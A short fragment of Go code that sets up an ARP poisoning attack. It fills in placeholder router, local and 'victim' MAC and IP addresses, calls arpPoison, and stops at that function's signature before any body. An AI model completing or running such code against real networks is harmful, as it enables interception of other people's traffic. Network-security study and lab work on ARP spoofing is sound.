...
/********* parse all IP's and MAC's relevent for poisoning / spoofing ********/
		routerMac, err := net.ParseMAC("AA:BB:CC:DD:EE:FF")
		routerIP := net.IP{192,168,1,2}
		localMac, err := net.ParseMAC("AA:BB:CC:DD:EE:FF")
		localIP := net.IP{192,168,1,1}
		victimMac, err := net.ParseMAC("AA:BB:CC:DD:EE:FF")
		victimIP := net.IP{192,168,1,3}
/********* end parse all IP's and MAC's relevent for poisoning / spoofing *********/
		...
		arpPoison(routerMac, routerIP, localMac, localIP, victimMac, victimIP)
}


func arpPoison(routerMac net.HardwareAddr,  routerIP net.IP, localMac net.HardwareAddr, localIP net.IP, victimMac net.HardwareAddr, victimIP net.IP) {
